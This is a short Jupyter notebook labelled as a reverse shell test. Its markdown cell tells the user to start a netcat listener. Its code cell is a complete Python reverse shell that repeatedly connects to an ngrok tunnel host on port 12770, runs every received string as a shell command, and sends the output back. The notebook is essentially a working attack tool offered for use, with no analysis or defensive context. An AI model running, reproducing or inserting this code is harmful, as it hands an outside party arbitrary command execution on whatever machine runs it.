{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Reverse Shell Test Notebook\n",
    "Run a listener using: `nc -l -k 12770` before executing the code cell."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys, os, subprocess, socket, time\n",
    "\n",
    "HOST = \"0.tcp.in.ngrok.io\"\n",
    "PORT = 12770\n",
    "\n",
    "def connect(host, port):\n",
    "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "    s.connect((host, port))\n",
    "    return s\n",
    "\n",
    "def wait_for_command(s):\n",
    "    data = s.recv(1024)\n",
    "    if data == b\"quit\\n\":\n",
    "        s.close()\n",
    "        sys.exit(0)\n",
    "    elif len(data) == 0:\n",
    "        return True\n",
    "    else:\n",
    "        proc = subprocess.Popen(data.decode(), shell=True,\n",
    "            stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n",
    "            stdin=subprocess.PIPE)\n",
    "        stdout_value = proc.stdout.read() + proc.stderr.read()\n",
    "        s.send(stdout_value)\n",
    "        return False\n",
    "\n",
    "def main():\n",
    "    while True:\n",
    "        socket_died = False\n",
    "        try:\n",
    "            s = connect(HOST, PORT)\n",
    "            while not socket_died:\n",
    "                socket_died = wait_for_command(s)\n",
    "            s.close()\n",
    "        except socket.error:\n",
    "            pass\n",
    "        time.sleep(5)\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    sys.exit(main())"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.x"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
